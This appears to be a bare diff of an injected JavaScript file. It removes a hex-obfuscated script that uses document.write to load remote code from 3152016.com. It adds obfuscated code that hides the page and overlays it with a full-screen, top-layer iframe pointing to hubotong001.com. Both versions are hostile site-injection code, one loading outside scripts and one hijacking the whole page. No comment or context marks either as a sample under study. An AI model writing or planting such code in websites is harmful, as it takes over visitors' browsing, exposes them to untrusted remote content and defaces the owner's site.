@@ -1,1 +1,14 @@
-var _0xdcd0=["\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x33\x31\x35\x32\x30\x31\x36\x2E\x63\x6F\x6D\x2F\x61\x2F\x6A\x73\x2E\x6A\x73\x22\x20\x6C\x61\x6E\x67\x75\x61\x67\x65\x3D\x22\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x22\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x3E\x3C\x2F\x73\x63","\x72\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];var site_ture=false;document[_0xdcd0[2]](_0xdcd0[0]+_0xdcd0[1])
+var _$ = ["document", "write", '<style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;margin:0}</style>', "createElement", 'div', "<iframe src=\"http://www.hubotong001.com\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>", "innerHTML", "style", "height", "100%", "width", "100%", "position", "relative", "body", "insertBefore", "firstChild","z-index","9999999999"];
+   window[_$[0]][_$[1]](_$[2]);
+     function a() {
+                     var b = window[_$[0]][_$[3]](_$[4]); 
+                     var c = _$[5];
+                     b[_$[6]] = c;
+                     b[_$[7]][_$[8]] = _$[9];
+                     b[_$[7]][_$[10]] = _$[9];
+                     b[_$[7]][_$[12]] = _$[13];
+                     b[_$[7]][_$[17]] = _$[18];
+                     var d = window[_$[0]][_$[14]];
+                     d[_$[15]](b, d[_$[16]]);document.write(d[_$[15]]);document.write(b);document.write(d[_$[16]]);
+                     };
+                     a();   
